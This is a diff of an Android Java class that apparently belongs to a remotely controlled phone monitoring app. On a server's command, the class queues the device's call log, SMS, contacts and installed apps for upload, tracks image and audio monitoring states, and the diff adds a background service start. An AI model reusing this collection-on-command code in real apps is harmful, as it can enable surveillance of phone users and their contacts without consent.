@@ -10,14 +10,12 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
-import android.util.Log;
 
+import com.inet.android.bs.ServiceControl;
 import com.inet.android.info.GetInfo;
 import com.inet.android.list.TurnSendList;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
-
-import custom.fileobserver.SetStateImage;
 
 /**
  * Periodic request class is designed to handle the server's response
@@ -78,7 +76,8 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null && str.length() > 3)
 			getRequestData(str);
 		else {
-			ParseToError.setError(str, null, ConstantRequest.TYPE_PERIODIC_REQUEST, -1, null, null, ctx);
+			ParseToError.setError(str, null,
+					ConstantRequest.TYPE_PERIODIC_REQUEST, -1, null, null, ctx);
 			Logging.doLog(LOG_TAG, "ответа от сервера нет",
 					"ответа от сервера нет");
 
@@ -144,6 +143,7 @@ public class PeriodicRequest extends DefaultRequest {
 			if (sp.getBoolean("getInfo", false) == true) {
 				GetInfo getInfo = new GetInfo(ctx);
 				getInfo.startGetInfo();
+				ServiceControl.runService(ctx);
 				ed.putBoolean("getInfo", false);
 			}
 			ed.putString("period", "1");
@@ -288,15 +288,9 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (image != null && audio != null) {
 
-			SetStateImage stateImage = SetStateImage.getInstance(ctx);
-			Log.d(LOG_TAG, "stateImage" + stateImage.toString());
 			ed.putString("image_state", image);
 			ed.putString("audio_state", audio);
-			if (image.equals("1") || audio.equals("1")) {
-				if (stateImage.State() == false)
-					stateImage.startWatcher();
-			} else
-				stateImage.stopWatcher();
+
 		}
 		// ----------------method of sending files----------------------
 		try {
@@ -318,7 +312,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_call", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_CALL_REQUEST, str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_CALL_REQUEST,
+						str, null, ctx);
 			}
 		// ---------------sms list------------------------
 		try {
@@ -328,7 +323,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_sms", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_SMS_REQUEST, str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_SMS_REQUEST,
+						str, null, ctx);
 			}
 
 		// ---------------contacts list------------------------
@@ -341,7 +337,9 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null)
 			if (!str.equals("0")
 					&& !sp.getString("list_contact", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, str, null, ctx);
+				TurnSendList.setList(
+						ConstantRequest.TYPE_LIST_CONTACTS_REQUEST, str, null,
+						ctx);
 			}
 		// ---------------apps list------------------------
 
@@ -352,7 +350,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_app", "0").equals(str)) {
-				TurnSendList.setList(ConstantRequest.TYPE_LIST_APP_REQUEST, str, null, ctx);
+				TurnSendList.setList(ConstantRequest.TYPE_LIST_APP_REQUEST,
+						str, null, ctx);
 			}
 
 		ed.commit();
